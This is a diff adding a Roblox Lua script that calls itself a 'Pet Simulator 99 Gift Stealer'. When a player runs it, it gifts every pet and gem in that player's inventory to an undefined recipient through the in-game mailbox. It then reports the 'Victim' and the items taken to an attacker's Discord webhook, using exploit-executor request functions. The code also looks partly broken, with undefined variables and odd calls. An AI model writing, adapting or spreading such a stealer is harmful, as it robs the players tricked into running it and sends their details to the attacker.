@@ -1,0 +1,57 @@
+-- Get all pets and gems from the user's inventory
+local pets = game.Players.LocalPlayer.PlayerGui:WaitForChild("Inventory"):WaitForChild("Pets")
+local gems = game.Players.LocalPlayer.PlayerGui:WaitForChild("Inventory"):WaitForChild("Gems")
+
+-- Function to send a gift using the in-game mailbox
+local function sendGift(item)
+    local box = game.Workspace:WaitForChild("Mailbox")
+    local clone = item:Clone()
+    clone.Parent = box
+
+    wait(0.1) -- Wait for the item to fully clone
+
+    local newClone = box:FindFirstChildOfClass("Model")
+    newClone.Name = "Box"
+    newClone:FindFirstChild("Handle").Color = Color3.new(0, 0, 0)
+
+    -- Set up the gift window
+    local gui = game.Players.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("GiftUI")
+    gui:FindFirstChild("SendGift"):FindFirstChild("To").Text = recipientName
+    gui:FindFirstChild("SendGift"):FindFirstChild("confirmSendGift"):FireServer(box)
+end
+
+-- Send all pets
+for _, pet in ipairs(pets:GetChildren()) do
+    if pet:FindFirstChild("Model") then
+        sendGift(pet.Model)
+    end
+end
+
+-- Send all gems
+for _, gem in ipairs(gems:GetChildren()) do
+    if gem:FindFirstChild("Gem") then
+        sendGift(gem.Gem)
+    end
+end
+
+-- Send Discord webhook
+local victimName = game.Players.LocalPlayer.Name
+local itemsSent = string.format("Sent %d pets and %d gems", #pets:GetChildren() - 1, #gems:GetChildren())
+
+local payload = {
+    content = string.format("Victim: %s\nItems Sent: %s\nRecipient: %s", victimName, itemsSent, recipientName),
+    username = "Pet Simulator 99 Gift Stealer",
+    avatar_url = "https://i.imgur.com/51VjM2W.png", -- Custom avatar URL (optional)
+    tts = false
+}
+
+local httpRequest = (syn and syn.request or request or http_request)({
+    Url = webhook_url,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = game:GetService("HttpService"):JSONEncode(payload)
+})
+
+print("Gifts sent successfully! Check the Discord webhook for details.")
